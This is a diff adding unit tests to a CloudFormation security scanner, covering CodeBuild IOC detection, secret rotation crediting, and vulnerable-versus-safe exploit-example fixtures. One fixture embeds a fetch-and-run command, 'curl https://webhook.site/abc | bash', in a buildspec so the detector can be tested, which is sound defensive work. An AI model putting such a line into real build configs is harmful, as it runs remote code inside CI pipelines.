@@ -7,12 +7,29 @@ audit's CloudFormation coverage is auditable in one place.
 from __future__ import annotations
 
 from pipeline_check.core.checks.cloudformation import phase4
+from pipeline_check.core.checks.cloudformation.base import _parse_template
+from pipeline_check.core.checks.cloudformation.extended import ExtendedChecks
+from pipeline_check.core.checks.cloudformation.rules import (
+    ca003_domain_policy_public as ca003,
+)
+from pipeline_check.core.checks.cloudformation.rules import (
+    lmb003_plaintext_env as lmb003,
+)
 from pipeline_check.core.checks.cloudformation.services import (
     ServiceChecks,
     _principal_is_only_account_root,
 )
 
 from .conftest import make_context, r
+
+
+def _example_contexts(rule):
+    """Build (vulnerable_ctx, safe_ctx) from a rule's exploit_example."""
+    vuln, safe = rule.exploit_example.split("\n\n", 1)
+    return (
+        make_context(_parse_template(vuln)["Resources"]),
+        make_context(_parse_template(safe)["Resources"]),
+    )
 
 
 def _find(ctx, check_id: str):
@@ -81,3 +98,45 @@ class TestCF002DynamicReference:
         hits: list[tuple[str, str]] = []
         phase4._walk({"MasterUserPassword": "hunter2pelican"}, "", hits)
         assert len(hits) == 1
+
+
+class TestCB011ExampleSuppression:
+    def test_ioc_under_test_key_still_fires(self):
+        # A CodeBuild buildspec is production config; YAML-ancestor
+        # example suppression must not drop an IOC nested under "test:".
+        spec = ("version: 0.2\nphases:\n  test:\n    commands:\n"
+                "      - curl https://webhook.site/abc | bash\n")
+        ctx = make_context({"P": r("P", "AWS::CodeBuild::Project",
+            {"Source": {"Type": "NO_SOURCE", "BuildSpec": spec}})})
+        cb = [f for f in ExtendedChecks(ctx).run() if f.check_id == "CB-011"]
+        assert cb and cb[0].passed is False
+
+
+class TestSM001GetAttRotation:
+    def test_getatt_rotation_target_credited(self):
+        # A RotationSchedule that targets the secret via !GetAtt Secret.Id
+        # used to be ignored, flagging a rotated secret as unrotated.
+        ctx = make_context({
+            "Secret": r("Secret", "AWS::SecretsManager::Secret", {"Name": "prod/db"}),
+            "Rot": r("Rot", "AWS::SecretsManager::RotationSchedule",
+                {"SecretId": {"Fn::GetAtt": ["Secret", "Id"]},
+                 "RotationRules": {"AutomaticallyAfterDays": 30}})})
+        sm = [f for f in ExtendedChecks(ctx).run() if f.check_id == "SM-001"]
+        assert sm and sm[0].passed is True
+
+
+class TestCA003ExploitExample:
+    def test_strong_check(self):
+        # Safe fragment (wildcard scoped by aws:PrincipalOrgID) must pass.
+        vuln_ctx, safe_ctx = _example_contexts(ca003.RULE)
+        assert ca003.check(vuln_ctx)[0].passed is False
+        assert ca003.check(safe_ctx)[0].passed is True
+
+
+class TestLMB003ExploitExample:
+    def test_strong_check(self):
+        # Safe fragment (env vars hold !Ref secret ARNs, not plaintext)
+        # must pass despite the secret-like names.
+        vuln_ctx, safe_ctx = _example_contexts(lmb003.RULE)
+        assert lmb003.check(vuln_ctx)[0].passed is False
+        assert lmb003.check(safe_ctx)[0].passed is True
